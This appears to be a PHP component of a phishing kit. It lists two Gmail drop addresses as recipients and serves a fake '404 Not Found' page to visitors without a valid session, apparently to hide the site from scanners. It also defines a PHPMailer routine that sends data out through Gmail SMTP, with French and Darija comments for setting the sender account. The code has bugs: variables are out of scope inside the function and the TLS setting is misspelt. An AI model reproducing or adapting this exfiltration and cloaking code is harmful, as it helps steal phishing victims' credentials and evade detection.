<?php
$send = "biloudede13@gmail.com,gsmduo1@gmail.com";
if(empty($_SESSION['code']) || time() - $_SESSION['code_time'] > 3600000)
{
	 header('HTTP/1.0 404 Not Found');
               die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}
$tabligh = "yes"; ///// dir yes walla no 
$gmail = ""; ///// adresse gmail bach dir tabligh
$gmailpass = ""; ////// mots de passe
function mailling($send, $subject, $message, $headers)
	{
		require_once './mail/PHPMailerAutoload.php';
		$mail = new PHPMailer;
		$mail->isSMTP();
		$mail->SMTPDebug = -1;
		// $mail->CharSet = 'UTF-8';
		// $mail->Debugoutput = 'html';
		$mail->Host = 'smtp.gmail.com';
		$mail->Port = '587';
		$mail->SMTPSecure = 'tsl';
		$mail->SMTPAuth = true;
		$mail->Username = $gmail;
		$mail->Password = $gmailpass;
		$mail->IsHTML(true);
		$mail->setFrom($gmail, '');
		$mail->addAddress($send, '');
		$mail->Subject = $subject;
		$mail->Body = $message."\n";
		$mail->AltBody = '';
		///if ($mail->send()) echo 'SEND';
		if(!$mail->send()) {
    //echo 'Message could not be sent.';
    //echo 'Mailer Error: ' . $mail->ErrorInfo;
} else {
    //echo 'Message has been sent';
}
}
?>